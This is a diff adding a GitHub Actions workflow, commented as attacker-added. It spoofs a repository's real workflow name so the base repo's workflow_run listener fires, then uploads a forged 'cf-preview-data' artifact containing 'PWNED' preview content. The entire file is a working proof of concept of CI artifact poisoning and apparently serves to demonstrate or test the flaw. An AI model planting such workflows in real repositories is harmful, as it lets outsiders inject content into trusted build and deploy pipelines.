@@ -1,0 +1,22 @@
+name: "CF: Build Docs Preview"
+# Attacker-added workflow in a pull request. It reuses the exact NAME of the
+# repository's real "CF: Build Docs Preview" workflow, so the base repo's
+# workflow_run listener for that name fires when this run completes.
+on:
+  pull_request:
+permissions: read-all
+jobs:
+  build-preview:
+    runs-on: ubuntu-24.04
+    steps:
+      - name: Forge the preview payload
+        run: |
+          mkdir -p payload/public
+          printf '<h1>PWNED: attacker controlled preview content</h1>\n' > payload/public/index.html
+          printf '{"note":"attacker artifact"}\n' > payload/public/_headers
+          echo ${{ github.event.number }} > payload/pr_number.txt
+      - name: Upload forged artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: cf-preview-data
+          path: payload/
